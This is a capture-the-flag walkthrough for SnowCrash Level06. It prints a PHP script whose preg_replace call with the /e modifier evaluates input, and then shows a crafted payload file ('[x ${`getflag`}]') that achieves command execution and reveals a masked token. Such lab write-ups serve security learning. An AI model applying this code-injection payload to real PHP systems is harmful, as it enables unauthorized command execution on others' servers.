---
title: 42 SnowCrash Level06 - Walkthrough 🤖
tags:
  - ctf
  - 42Project
  - snowcrash
  - php
  - exploit
  - app-script
categories:
  - ctfs
  - 42project
date: 2024-05-18 15:08:30
---

![snowcrash](/images/snowcrash.png)

## Introduction:
In level 06, we exploit a PHP script (`level06.php`) that heavily uses the `preg_replace()` function. By crafting a specific input file, we execute arbitrary commands to obtain the flag.

### Steps:

1. **Examining the PHP Script:**
   We inspect the contents of the `level06.php` script:

   ```php
   <?php
   function y($m) 
   {
       $m = preg_replace("/\./", " x ", $m);
       $m = preg_replace("/@/", " y", $m); 
       return $m; 
   }
   function x($y, $z)
   { 
       $a = file_get_contents($y);
       $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
       $a = preg_replace("/\[/", "(", $a);
       $a = preg_replace("/\]/", ")", $a);
       return $a;
   }
   $r = x($argv[1], $argv[2]);
   print $r;
   ?>
   ```
   
   The script defines two functions, x() and y(), and uses preg_replace() extensively. The critical line is:
   
   ```php
   $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
   ```
   It evaluates the result of the y() function on the content within [x ...].

2. Crafting Input File:
    We create a file containing the command we want to execute, wrapped in [x ${...} ]:

    ```shell
    level06@SnowCrash:~$ echo -e "[x \${\`getflag\`}]" > /tmp/test
    ```
3. Exploiting the Script:
    We execute the script with the crafted input file:
    ```
    level06@SnowCrash:~$ ./level06 /tmp/test aaa
    PHP Notice:  Undefined variable: Check flag.Here is your token : **********************
    in /home/user/level06/level06.php(4) : regexp code on line 1
    ```
    The script executes the getflag command within the PHP environment and displays the flag.

# Conclusion
By understanding the behavior of the level06.php script and exploiting its use of preg_replace() with the /e modifier, we successfully executed arbitrary commands and obtained the flag for level 06.

